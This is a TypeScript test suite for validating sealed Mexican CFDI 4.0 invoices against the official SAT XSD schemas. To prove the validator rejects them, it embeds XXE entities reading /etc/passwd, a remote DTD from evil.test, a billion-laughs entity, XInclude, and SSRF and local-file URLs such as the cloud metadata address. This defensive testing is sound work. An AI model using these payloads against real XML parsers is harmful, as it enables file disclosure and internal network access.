import assert from "node:assert/strict";
import { after, before, test } from "node:test";
import dns from "node:dns";
import fs, { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import http from "node:http";
import https from "node:https";
import net from "node:net";
import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import xsdSource from "../src/lib/sat/cfdi40/cfdv40-xsd.json";
import {
  buildPreSealCfdi40,
  buildUnsignedCfdi40,
} from "../src/lib/cfdi40/build";
import {
  loadCfdi40Catalogs,
  type Cfdi40Catalogs,
} from "../src/lib/cfdi40/catalogs";
import { Cfdi40Error, type Cfdi40Issue } from "../src/lib/cfdi40/errors";
import {
  compileCfdi40Xslt,
  generateCfdi40OriginalString,
  type Cfdi40CompiledXslt,
} from "../src/lib/cfdi40/original-string";
import { productionCfdiGates } from "../src/lib/cfdi40/production-gates";
import {
  cfdi40XsdProblems,
  compileCfdi40Xsd,
  isXsdValidatedCfdi40,
  pacSubmission,
  unavailableXsdEngine,
  validateSealedCfdi40Xsd,
  type Cfdi40XsdEngine,
} from "../src/lib/cfdi40/schema";
import {
  createSealedCfdi40,
  isSealedCfdi40,
  sealedCfdi40XmlProblems,
} from "../src/lib/cfdi40/sealed";
import { serializePreSealCfdi40 } from "../src/lib/cfdi40/serialize";
import {
  cfdi40XsdEngineId,
  loadCfdi40XsdEngine,
  validateOfficialSealedCfdi40Xsd,
} from "../src/lib/cfdi40/xsd-engine";
import {
  cfdi40XsdRootUrl,
  loadCfdi40XsdBundle,
  resolveSatXsdImport,
  verifyCfdi40XsdBundle,
  type Cfdi40XsdBundle,
  type Cfdi40XsdBundleSource,
} from "../src/lib/cfdi40/xsd-resources";
import { cfdi40XsltEngine } from "../src/lib/cfdi40/xslt-engine";
import {
  loadCfdi40XsltBundle,
  type Cfdi40XsltBundle,
} from "../src/lib/cfdi40/xslt-resources";
import type {
  Cfdi40CertificateBinding,
  SealedCfdi40Xml,
} from "../src/lib/cfdi40/types";
import { signCfdiSeal } from "../src/lib/csd/signing";
import { validateSealedCfdi40XsdForInvoice } from "../src/services/cfdi40-xsd";
import { issuedAt, validFixtures } from "./fixtures/cfdi40";
import { syntheticAuthority, syntheticCsd } from "./fixtures/synthetic-csd.mjs";

// Fase 5C.7: official SAT XSD validation of CFDI sealed by ORBIT. Every positive case goes
// through the real pipeline (build → pre-seal → official XSLT → CSD signature → sealed) and
// then the real engine (libxml2-wasm) with the versioned, hash-verified schemas. SYNTHETIC
// keys and certificates; no CFDI here is "verified by the SAT".

const names = Object.keys(validFixtures) as (keyof typeof validFixtures)[];
const authority = syntheticAuthority();
const csd = syntheticCsd(authority, {
  certificateNumber: "30001000000000000001",
  validFrom: new Date("2026-01-01T00:00:00Z"),
  validTo: new Date("2036-01-01T00:00:00Z"),
});
const binding: Cfdi40CertificateBinding = {
  noCertificado: "30001000000000000001",
  certificadoBase64: Buffer.from(csd.certificate).toString("base64"),
};

let catalogs: Cfdi40Catalogs;
let xslt: Cfdi40XsltBundle;
let stylesheet: Cfdi40CompiledXslt;
let engine: Cfdi40XsdEngine;
let bundle: Cfdi40XsdBundle;
const sealed = new Map<string, SealedCfdi40Xml>();

/** Real pipeline: pre-seal → official cadena → CSD signature → verified sealed CFDI. */
function seal(preSeal: ReturnType<typeof buildPreSealCfdi40>["xml"]) {
  const cadena = generateCfdi40OriginalString(preSeal, {
    engine: cfdi40XsltEngine,
    bundle: xslt,
  });
  return createSealedCfdi40(
    preSeal,
    cadena,
    signCfdiSeal(csd.keyObject, cadena.bytes).toString("base64"),
    stylesheet,
  );
}

before(async () => {
  catalogs = await loadCfdi40Catalogs();
  xslt = await loadCfdi40XsltBundle();
  stylesheet = compileCfdi40Xslt(cfdi40XsltEngine, xslt);
  engine = await loadCfdi40XsdEngine();
  bundle = await loadCfdi40XsdBundle();
  for (const name of names)
    sealed.set(
      name,
      seal(
        buildPreSealCfdi40(validFixtures[name].invoice(), {
          issuedAt,
          catalogs,
          certificate: binding,
        }).xml,
      ),
    );
});

const codes = (issues: readonly Cfdi40Issue[]) => issues.map((i) => i.code);
const codeOf = (action: () => unknown) => {
  try {
    action();
  } catch (error) {
    return error instanceof Cfdi40Error ? error.issues[0].code : "OTHER_ERROR";
  }
  return "NO_ERROR";
};

// --- Resources ----------------------------------------------------------------------------

test("the official XSD set is versioned byte-exact: cfdv40.xsd imports catCFDI and tdCFDI, nothing else", async () => {
  assert.equal(bundle.rootUrl, cfdi40XsdRootUrl);
  assert.deepEqual([...bundle.schemas.keys()].sort(), [
    "http://www.sat.gob.mx/sitio_internet/cfd/4/cfdv40.xsd",
    "http://www.sat.gob.mx/sitio_internet/cfd/catalogos/catCFDI.xsd",
    "http://www.sat.gob.mx/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
  ]);
  const root = bundle.schemas.get(cfdi40XsdRootUrl)!;
  assert.equal(root.namespace, "http://www.sat.gob.mx/cfd/4");
  assert.deepEqual(root.imports, [
    "http://www.sat.gob.mx/sitio_internet/cfd/catalogos/catCFDI.xsd",
    "http://www.sat.gob.mx/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
  ]);
  for (const schema of bundle.schemas.values()) {
    // The bundled text is exactly the versioned file.
    const stored = await readFile(join("resources/sat/cfdi40", schema.name));
    assert(Buffer.from(schema.bytes).equals(stored), schema.name);
    if (schema.url !== cfdi40XsdRootUrl) assert.deepEqual(schema.imports, []);
  }
});

test("a modified, missing, extra, mis-namespaced or undeclared schema fails closed", () => {
  const source = xsdSource as Cfdi40XsdBundleSource;
  const variant = (
    change: (r: Cfdi40XsdBundleSource["resources"][number]) => object | null,
  ) => ({
    ...source,
    resources: source.resources
      .map((r) => (r.name === "tdCFDI.xsd" ? change(r) : r))
      .filter(
        (r): r is Cfdi40XsdBundleSource["resources"][number] => r !== null,
      ),
  });
  const verify = (s: object) =>
    codeOf(() => verifyCfdi40XsdBundle(s as Cfdi40XsdBundleSource));
  assert.equal(verify(source), "NO_ERROR");
  assert.equal(
    verify(variant((r) => ({ ...r, text: r.text.replace("t_RFC", "t_RFX") }))),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "one character changed",
  );
  assert.equal(
    verify(variant((r) => ({ ...r, sha256: "0".repeat(64) }))),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "declared hash changed",
  );
  assert.equal(
    verify(variant(() => null)),
    "CFDI_XSD_SCHEMA_UNAVAILABLE",
    "missing",
  );
  assert.equal(
    verify({
      ...source,
      resources: [
        ...source.resources,
        {
          ...source.resources[1],
          url: "http://www.sat.gob.mx/sitio_internet/cfd/extra.xsd",
          name: "extra.xsd",
        },
      ],
    }),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "extra schema",
  );
  assert.equal(
    verify(variant((r) => ({ ...r, namespace: "http://www.sat.gob.mx/otro" }))),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "unexpected namespace",
  );
  assert.equal(
    verify(
      variant((r) => ({
        ...r,
        text: r.text.replace(
          /(<xs:schema\b[^>]*>)/,
          '$1<xs:import namespace="urn:x" schemaLocation="http://www.sat.gob.mx/sitio_internet/cfd/x.xsd"/>',
        ),
      })),
    ),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "import not declared in the manifest",
  );
  assert.equal(
    verify({
      ...source,
      root: "http://www.sat.gob.mx/sitio_internet/cfd/3/cfdv33.xsd",
    }),
    "CFDI_XSD_SCHEMA_UNAVAILABLE",
  );
});

test("the resolver serves only allowlisted official SAT URLs, exactly as written", () => {
  for (const url of bundle.schemas.keys())
    assert(resolveSatXsdImport(bundle, url) instanceof Uint8Array, url);
  const tdcfdi =
    "http://www.sat.gob.mx/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd";
  for (const location of [
    tdcfdi.replace("http:", "https:"),
    tdcfdi + "?v=2",
    tdcfdi + "#x",
    "HTTP://WWW.SAT.GOB.MX/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
    "http://www.sat.gob.mx:80/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
    "http://www.sat.gob.mx/sitio_internet/cfd/tipoDatos/tdCFDI/../tdCFDI/tdCFDI.xsd",
    "http://sat.gob.mx.evil.test/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
    "http://localhost/tdCFDI.xsd",
    "http://127.0.0.1/tdCFDI.xsd",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/tdCFDI.xsd",
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
    "data:text/xml,<x/>",
    "\\\\server\\share\\tdCFDI.xsd",
    "C:\\Windows\\win.ini",
    "../tdCFDI.xsd",
    "tdCFDI.xsd",
    "",
  ])
    assert.equal(resolveSatXsdImport(bundle, location), null, location);
});

test("the schema compiles once per XSD set, loading exactly the declared imports; anything else fails closed", () => {
  const stub = (
    requests: (load: (u: string) => Uint8Array | null) => void,
    counter = { n: 0 },
  ): Cfdi40XsdEngine => ({
    id: "stub",
    compile(_root, load) {
      counter.n++;
      requests(load);
      return { validate: () => [] };
    },
  });
  const imports = [...bundle.schemas.get(cfdi40XsdRootUrl)!.imports];
  const counter = { n: 0 };
  const exact = stub((load) => imports.forEach((u) => load(u)), counter);
  compileCfdi40Xsd(exact, bundle);
  compileCfdi40Xsd(exact, bundle);
  assert.equal(counter.n, 1, "cached for the same XSD set");
  // Another bundle object (another version of the set) never reuses a compiled schema.
  const again = verifyCfdi40XsdBundle(xsdSource as Cfdi40XsdBundleSource);
  compileCfdi40Xsd(exact, again);
  assert.equal(counter.n, 2);
  assert.equal(
    codeOf(() =>
      compileCfdi40Xsd(
        stub((load) =>
          [...imports, "http://evil.test/x.xsd"].forEach((u) => load(u)),
        ),
        bundle,
      ),
    ),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "asked for a URL outside the set",
  );
  assert.equal(
    codeOf(() =>
      compileCfdi40Xsd(
        stub((load) => void load(imports[0])),
        bundle,
      ),
    ),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
    "did not load every declared import",
  );
  assert.equal(
    codeOf(() =>
      compileCfdi40Xsd(
        {
          id: "broken",
          compile() {
            throw new Error("wasm failure");
          },
        },
        bundle,
      ),
    ),
    "CFDI_XSD_SCHEMA_UNAVAILABLE",
  );
  // Without an engine nothing is validated, even a genuine sealed CFDI.
  assert.equal(
    codeOf(() =>
      validateSealedCfdi40Xsd(sealed.get("ingreso-pue-iva16")!, {
        engine: unavailableXsdEngine,
        bundle,
      }),
    ),
    "CFDI_XSD_SCHEMA_UNAVAILABLE",
  );
});

// --- Positive -----------------------------------------------------------------------------

test("every supported CFDI sealed by ORBIT validates against the official XSD, byte for byte", async () => {
  // Ingreso PUE/PPD, IVA 16 %, exento, descuento, retenciones, varios conceptos and tax
  // groups, persona física, receptor genérico, escaping/Unicode and USD.
  assert.equal(names.length, 10);
  for (const name of names) {
    const cfdi = sealed.get(name)!;
    const validated = await validateOfficialSealedCfdi40Xsd(cfdi);
    assert(isXsdValidatedCfdi40(validated), name);
    assert.equal(validated.stage, "XSD_VALIDATED");
    // Exactly the sealed bytes, not a reparse or reserialization.
    assert.equal(validated.xml, cfdi.xml);
    assert.deepEqual(validated.bytes, cfdi.bytes);
    assert.notEqual(validated.bytes, cfdi.bytes, "a private copy");
    assert.equal(validated.sha256, cfdi.sha256);
    assert.equal(validated.preSealSha256, cfdi.preSealSha256);
    assert.equal(validated.originalStringSha256, cfdi.originalStringSha256);
    assert.deepEqual(validated.xsd, {
      bundleSha256: bundle.bundleSha256,
      engine: cfdi40XsdEngineId,
    });
    assert.equal(pacSubmission(validated).cfdi, validated);
    assert.deepEqual(cfdi40XsdProblems(cfdi.xml, { engine, bundle }), []);
  }
  // Changing one byte afterwards: the validated value can no longer be used.
  const validated = await validateOfficialSealedCfdi40Xsd(
    sealed.get("ingreso-ppd")!,
  );
  const at = validated.xml.indexOf(' Total="') + 8;
  validated.bytes[at] = validated.bytes[at] === 0x31 ? 0x32 : 0x31;
  assert.equal(isXsdValidatedCfdi40(validated), false);
  assert.equal(
    codeOf(() => pacSubmission(validated)),
    "XSD_VALIDATED_CFDI_REQUIRED",
  );
  // Look-alikes never are.
  assert.equal(isXsdValidatedCfdi40({ ...validated }), false);
  assert.equal(
    codeOf(() => pacSubmission(sealed.get("ingreso-ppd")!)),
    "XSD_VALIDATED_CFDI_REQUIRED",
  );
});

// --- Negative -----------------------------------------------------------------------------

test("controlled mutations of a sealed CFDI fail with stable codes, element paths and no values", () => {
  const base = sealed.get("ingreso-multiples-conceptos")!.xml;
  const emisor = /<cfdi:Emisor [^>]*\/>/.exec(base)![0];
  const receptor = /<cfdi:Receptor [^>]*\/>/.exec(base)![0];
  const folio = /Folio="[^"]*"/.exec(base)![0];
  const replace = (from: string | RegExp, to: string) => {
    const changed = base.replace(from, to);
    assert.notEqual(changed, base, String(from));
    return changed;
  };
  const cases: [string, string, string, string, string][] = [
    // label, mutated XML, code, rule, path
    [
      "atributo requerido ausente",
      replace(' Moneda="MXN"', ""),
      "CFDI_XSD_INVALID",
      "XSD:ATTRIBUTE_MISSING",
      "/cfdi:Comprobante/@Moneda",
    ],
    [
      "atributo no permitido",
      replace(' Version="4.0"', ' Version="4.0" Foo="x"'),
      "CFDI_XSD_INVALID",
      "XSD:ATTRIBUTE_NOT_ALLOWED",
      "/cfdi:Comprobante/@Foo",
    ],
    [
      "elemento fuera de orden",
      replace(emisor + receptor, receptor + emisor),
      "CFDI_XSD_INVALID",
      "XSD:ELEMENT_UNEXPECTED",
      "/cfdi:Comprobante/cfdi:Receptor",
    ],
    [
      "Version incorrecta",
      replace(' Version="4.0"', ' Version="3.3"'),
      "CFDI_XSD_INVALID",
      "XSD:VALUE_FIXED",
      "/cfdi:Comprobante/@Version",
    ],
    [
      "decimal inválido",
      replace(' SubTotal="3523.82"', ' SubTotal="35.23.82"'),
      "CFDI_XSD_INVALID",
      "XSD:VALUE_TYPE",
      "/cfdi:Comprobante/@SubTotal",
    ],
    [
      "patrón inválido",
      replace(' Rfc="SCA010101AB1"', ' Rfc="sca010101ab1"'),
      "CFDI_XSD_INVALID",
      "XSD:FACET_pattern",
      "/cfdi:Comprobante/cfdi:Emisor/@Rfc",
    ],
    [
      "enumeración inválida",
      replace(' Moneda="MXN"', ' Moneda="ZZZ"'),
      "CFDI_XSD_INVALID",
      "XSD:FACET_enumeration",
      "/cfdi:Comprobante/@Moneda",
    ],
    [
      "longitud inválida",
      replace(folio, `Folio="${"F".repeat(41)}"`),
      "CFDI_XSD_INVALID",
      "XSD:FACET_maxLength",
      "/cfdi:Comprobante/@Folio",
    ],
    [
      "nodo duplicado",
      replace(emisor, emisor + emisor),
      "CFDI_XSD_INVALID",
      "XSD:ELEMENT_UNEXPECTED",
      "/cfdi:Comprobante/cfdi:Emisor[2]",
    ],
    [
      "elemento desconocido",
      replace(receptor, receptor + "<cfdi:Desconocido/>"),
      "CFDI_XSD_INVALID",
      "XSD:ELEMENT_UNEXPECTED",
      "/cfdi:Comprobante/cfdi:Desconocido",
    ],
    [
      "namespace incorrecto",
      replace(
        'xmlns:cfdi="http://www.sat.gob.mx/cfd/4"',
        'xmlns:cfdi="http://www.sat.gob.mx/cfd/3"',
      ),
      "CFDI_XSD_UNSUPPORTED_NAMESPACE",
      "XSD:NAMESPACE",
      "/cfdi:Comprobante",
    ],
    [
      "schemaLocation malformado",
      replace(
        /xsi:schemaLocation="[^"]*"/,
        'xsi:schemaLocation="http://www.sat.gob.mx/cfd/4"',
      ),
      "CFDI_XSD_INVALID",
      "XSD:SCHEMA_LOCATION",
      "/cfdi:Comprobante/@xsi:schemaLocation",
    ],
    [
      "schemaLocation a otro esquema",
      replace(
        /xsi:schemaLocation="[^"]*"/,
        'xsi:schemaLocation="http://www.sat.gob.mx/cfd/4 http://evil.test/cfdv40.xsd"',
      ),
      "CFDI_XSD_INVALID",
      "XSD:SCHEMA_LOCATION",
      "/cfdi:Comprobante/@xsi:schemaLocation",
    ],
    [
      "XML mal formado",
      base.slice(0, -20),
      "CFDI_XSD_MALFORMED_XML",
      "XSD:NOT_WELL_FORMED",
      "/cfdi:Comprobante",
    ],
    [
      "DTD",
      replace("?>", "?><!DOCTYPE cfdi:Comprobante>"),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "entidad externa",
      replace(
        "?>",
        '?><!DOCTYPE cfdi:Comprobante [<!ENTITY x SYSTEM "file:///etc/passwd">]>',
      ),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "entidad de parámetro",
      replace(
        "?>",
        '?><!DOCTYPE cfdi:Comprobante [<!ENTITY % p SYSTEM "http://evil.test/p.dtd"> %p;]>',
      ),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "billion laughs",
      replace(
        "?>",
        '?><!DOCTYPE cfdi:Comprobante [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]>',
      ),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "XInclude",
      replace(
        "<cfdi:Emisor",
        '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd"/><cfdi:Emisor',
      ),
      "CFDI_XSD_UNSUPPORTED_NAMESPACE",
      "XSD:NAMESPACE",
      "/cfdi:Comprobante",
    ],
    [
      "comentario",
      replace("<cfdi:Emisor", "<!-- x --><cfdi:Emisor"),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "CDATA",
      replace("</cfdi:Comprobante>", "<![CDATA[x]]></cfdi:Comprobante>"),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "instrucción de procesamiento",
      replace("?>", '?><?xml-stylesheet href="http://evil.test/x.xsl"?>'),
      "CFDI_XSD_FORBIDDEN_MARKUP",
      "XSD:MARKUP",
      "/cfdi:Comprobante",
    ],
    [
      "complemento no soportado",
      replace(
        "xmlns:xsi=",
        'xmlns:pago20="http://www.sat.gob.mx/Pagos20" xmlns:xsi=',
      ).replace(
        "</cfdi:Comprobante>",
        "<cfdi:Complemento><pago20:Pagos/></cfdi:Complemento></cfdi:Comprobante>",
      ),
      "CFDI_XSD_UNSUPPORTED_NAMESPACE",
      "XSD:NAMESPACE",
      "/cfdi:Comprobante",
    ],
    [
      "complemento sin esquema",
      replace(
        "</cfdi:Comprobante>",
        "<cfdi:Complemento><cfdi:Otro/></cfdi:Complemento></cfdi:Comprobante>",
      ),
      "CFDI_XSD_UNSUPPORTED_NAMESPACE",
      "XSD:UNDECLARED_ELEMENT",
      "/cfdi:Comprobante/cfdi:Complemento/cfdi:Otro",
    ],
    [
      "addenda",
      replace(
        "</cfdi:Comprobante>",
        "<cfdi:Addenda><Proveedor/></cfdi:Addenda></cfdi:Comprobante>",
      ),
      "CFDI_XSD_UNSUPPORTED_NAMESPACE",
      "XSD:UNDECLARED_ELEMENT",
      "/cfdi:Comprobante/cfdi:Addenda/Proveedor",
    ],
  ];
  for (const [label, xml, code, rule, path] of cases) {
    const issues = cfdi40XsdProblems(xml, { engine, bundle });
    assert(issues.length >= 1 && issues.length <= 20, label);
    assert.equal(issues[0].code, code, label);
    assert.equal(issues[0].rule, rule, label);
    assert.equal(issues[0].path, path, label);
    // Curated message and no values, XML, URLs or engine text.
    const text = JSON.stringify(issues);
    for (const leak of [
      "ZZZ",
      "sca010101ab1",
      "35.23.82",
      "FFFFFFFFFF",
      "evil.test",
      "/etc/passwd",
      "<",
      "libxml",
      "Element '",
    ])
      assert(!text.includes(leak), `${label}: ${leak}`);
  }
});

// --- Gates are independent ----------------------------------------------------------------

test("A: a valid Sello does not make the XML XSD-valid; B: an XSD-valid XML with a bad Sello is not sealed; C: both → candidate, not stamped", async () => {
  // A. A real sealed CFDI (registered, Sello verified) whose content violates the XSD: the
  // document is built and sealed without ORBIT's catalog validation, to prove the XSD gate
  // stands on its own.
  const { document } = buildUnsignedCfdi40(
    validFixtures["ingreso-pue-iva16"].invoice(),
    { issuedAt, catalogs },
  );
  const invalidPreSeal = serializePreSealCfdi40(
    { ...document, currency: "ZZZ" },
    binding,
  );
  const sealedButInvalid = seal(invalidPreSeal);
  assert(isSealedCfdi40(sealedButInvalid));
  assert.deepEqual(
    sealedCfdi40XmlProblems(sealedButInvalid.xml, stylesheet, binding),
    [],
    "the Sello verifies",
  );
  const issues = await (async () => {
    try {
      await validateOfficialSealedCfdi40Xsd(sealedButInvalid);
    } catch (error) {
      if (error instanceof Cfdi40Error) return error.issues;
      throw error;
    }
    return [];
  })();
  assert.deepEqual(codes(issues), ["CFDI_XSD_INVALID"]);
  assert.equal(issues[0].rule, "XSD:FACET_enumeration");
  assert.equal(
    codeOf(() => pacSubmission(sealedButInvalid)),
    "XSD_VALIDATED_CFDI_REQUIRED",
    "no PAC",
  );

  // B. The same valid XML with one Sello character changed: still XSD-valid (canonical Base64
  // of the right length) but the seal does not verify, so it is never a SealedCfdi40Xml.
  const good = sealed.get("ingreso-exento")!;
  const sello = /\sSello="([^"]+)"/.exec(good.xml)![1];
  const flipped =
    sello.slice(0, 20) + (sello[20] === "A" ? "B" : "A") + sello.slice(21);
  const badSeal = good.xml.replace(sello, flipped);
  assert.deepEqual(
    cfdi40XsdProblems(badSeal, { engine, bundle }),
    [],
    "XSD-valid",
  );
  assert(
    sealedCfdi40XmlProblems(badSeal, stylesheet).includes("SELLO_NOT_VERIFIED"),
  );
  assert.equal(
    codeOf(() =>
      validateSealedCfdi40Xsd({ ...good, xml: badSeal } as SealedCfdi40Xml, {
        engine,
        bundle,
      }),
    ),
    "SEALED_CFDI_REQUIRED",
  );

  // C. Valid Sello and valid XSD: a candidate for the next gate (PAC sandbox), nothing more.
  const validated = await validateOfficialSealedCfdi40Xsd(good);
  assert.equal(pacSubmission(validated).cfdi, validated);
  assert(!/TimbreFiscalDigital|UUID=/.test(validated.xml), "not stamped");
});

// --- Security: no network, no files, nothing outside the bundle ---------------------------

test("a schema import can never read a host file: refused by the resolver and absent from the engine's file system", async () => {
  const directory = mkdtempSync(join(tmpdir(), "orbit-xsd-hostfs-"));
  try {
    const evil = join(directory, "evil.xsd");
    writeFileSync(
      evil,
      '<?xml version="1.0"?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="urn:o" elementFormDefault="qualified"><xs:element name="e" type="xs:string"/></xs:schema>',
    );
    for (const location of [
      evil,
      pathToFileURL(evil).href,
      "http://evil.test/x.xsd",
    ]) {
      const requested: string[] = [];
      const root = new TextEncoder().encode(
        `<?xml version="1.0"?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:o="urn:o" targetNamespace="urn:t" elementFormDefault="qualified"><xs:import namespace="urn:o" schemaLocation="${location}"/><xs:element name="r"><xs:complexType><xs:sequence><xs:element ref="o:e"/></xs:sequence></xs:complexType></xs:element></xs:schema>`,
      );
      let used = false;
      try {
        const compiled = engine.compile(
          { url: cfdi40XsdRootUrl, bytes: root },
          (url) => {
            requested.push(url);
            return null;
          },
        );
        used =
          compiled.validate(
            new TextEncoder().encode(
              '<r xmlns="urn:t"><e xmlns="urn:o">x</e></r>',
            ),
          ).length === 0;
      } catch {
        used = false;
      }
      assert.equal(used, false, location);
      // A URL reaches the closed resolver, which refuses it; libxml2 does not even try a raw
      // Windows path (not a URI reference). Either way the file is never read.
      assert.deepEqual(
        requested,
        location === evil ? [] : [location],
        location,
      );
    }
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

const attempts: string[] = [];
const output: string[] = [];
const restore: (() => void)[] = [];
function guard<T extends object, K extends keyof T>(
  target: T,
  key: K,
  label: string,
  block: boolean,
) {
  const original = target[key];
  restore.push(() => {
    target[key] = original;
  });
  target[key] = function () {
    (block ? attempts : output).push(label);
    if (block) throw new Error("BLOCKED " + label);
    return undefined;
  } as T[K];
}
after(() => {
  for (const undo of restore.reverse()) undo();
});

test("compiling and validating make no network, file or console access", () => {
  // Everything loaded beforehand; a new bundle object forces a fresh compile under the guards.
  const fresh = verifyCfdi40XsdBundle(xsdSource as Cfdi40XsdBundleSource);
  guard(globalThis, "fetch", "fetch", true);
  guard(http, "request", "http.request", true);
  guard(https, "request", "https.request", true);
  guard(net.Socket.prototype, "connect", "net.connect", true);
  guard(dns, "lookup", "dns.lookup", true);
  for (const method of [
    "readFileSync",
    "readFile",
    "openSync",
    "open",
    "createReadStream",
  ] as const)
    guard(fs, method, "fs." + method, true);
  guard(fs.promises, "readFile", "fs.promises.readFile", true);
  guard(fs.promises, "open", "fs.promises.open", true);
  for (const method of ["log", "info", "warn", "error", "debug"] as const)
    guard(console, method, "console." + method, false);
  // Self-check of the guards.
  assert.throws(() => fs.readFileSync("package.json"));
  assert.throws(() => http.request("http://example.test"));
  assert.deepEqual(attempts.splice(0), ["fs.readFileSync", "http.request"]);
  for (const name of names) {
    const validated = validateSealedCfdi40Xsd(sealed.get(name)!, {
      engine,
      bundle: fresh,
    });
    assert(isXsdValidatedCfdi40(validated));
  }
  // Invalid and hostile inputs too.
  const base = sealed.get("ingreso-ppd")!.xml;
  cfdi40XsdProblems(base.replace(' Moneda="MXN"', ' Moneda="ZZZ"'), {
    engine,
    bundle: fresh,
  });
  cfdi40XsdProblems(base.slice(0, -10), { engine, bundle: fresh });
  for (const undo of restore.splice(0).reverse()) undo();
  assert.deepEqual(attempts, []);
  assert.deepEqual(output, []);
});

// --- Static review, audit and gate --------------------------------------------------------

test("XSD code: no network, files, processes, eval or console; server-only engine", async () => {
  for (const file of [
    "src/lib/cfdi40/schema.ts",
    "src/lib/cfdi40/xsd-resources.ts",
    "src/lib/cfdi40/xsd-engine.ts",
    "src/services/cfdi40-xsd.ts",
  ]) {
    const text = await readFile(file, "utf8");
    assert(
      !/\bfetch\(|XMLHttpRequest|node:(fs|http|https|net|dns|child_process|worker_threads)|from "(fs|http|https|net|child_process)"|\beval\(|new Function|\bconsole\./.test(
        text,
      ),
      file,
    );
  }
  for (const file of [
    "src/lib/cfdi40/xsd-engine.ts",
    "src/services/cfdi40-xsd.ts",
  ])
    assert.match(await readFile(file, "utf8"), /^import "server-only";/, file);
  // The engine is never registered with file-system providers.
  assert.doesNotMatch(
    await readFile("src/lib/cfdi40/xsd-engine.ts", "utf8"),
    /nodejs\.mjs|xmlRegisterFsInputProviders|fsInputProviders/,
  );
});

test("audit: cfdi.xsd.validated / cfdi.xsd.failed keep only the XSD set's short hash and a code", async () => {
  const writes: { data: Record<string, unknown> }[] = [];
  const db = {
    auditEvent: {
      create: async (args: { data: Record<string, unknown> }) => {
        writes.push(args);
        return { id: "event" };
      },
    },
  } as never;
  const actor = { organizationId: "org-a", userId: "user-a" };
  await validateSealedCfdi40XsdForInvoice(db, actor, {
    sealed: sealed.get("ingreso-descuento")!,
    invoiceId: "inv-1",
  });
  const { document } = buildUnsignedCfdi40(
    validFixtures["ingreso-pue-iva16"].invoice(),
    { issuedAt, catalogs },
  );
  const invalid = seal(
    serializePreSealCfdi40({ ...document, currency: "ZZZ" }, binding),
  );
  await assert.rejects(
    validateSealedCfdi40XsdForInvoice(db, actor, {
      sealed: invalid,
      invoiceId: "inv-2",
    }),
    (error) =>
      error instanceof Cfdi40Error &&
      error.issues[0].code === "CFDI_XSD_INVALID",
  );
  assert.deepEqual(
    writes.map((w) => [
      w.data.action,
      w.data.result,
      w.data.targetId,
      w.data.metadata,
    ]),
    [
      [
        "cfdi.xsd.validated",
        "SUCCESS",
        "inv-1",
        { xsdBundle: bundle.bundleSha256.slice(0, 16) },
      ],
      [
        "cfdi.xsd.failed",
        "FAILURE",
        "inv-2",
        {
          errorCode: "CFDI_XSD_INVALID",
          xsdBundle: bundle.bundleSha256.slice(0, 16),
        },
      ],
    ],
  );
  const text = JSON.stringify(writes);
  for (const leak of [
    "<cfdi",
    "Sello",
    binding.certificadoBase64.slice(0, 30),
    "SCA010101AB1",
    "ZZZ",
    "1160.00",
  ])
    assert(!text.includes(leak), leak);
});

test("production: the XSD gate never unlocks signing, the PAC or ISSUED", async () => {
  // Pinned on purpose: changing it needs the evidence in docs/tasks/FASE5C7-XSD-VALIDATION.md.
  assert.deepEqual(
    { ...productionCfdiGates },
    { XSD_OFFICIAL_VALIDATION_READY: true },
  );
  const signing = await readFile("src/lib/csd/production-gates.ts", "utf8");
  assert.doesNotMatch(signing, /XSD/);
  // No PAC adapter exists yet.
  const sources = await readFile("src/lib/cfdi40/schema.ts", "utf8");
  assert.match(sources, /export interface Cfdi40PacAdapter/);
});
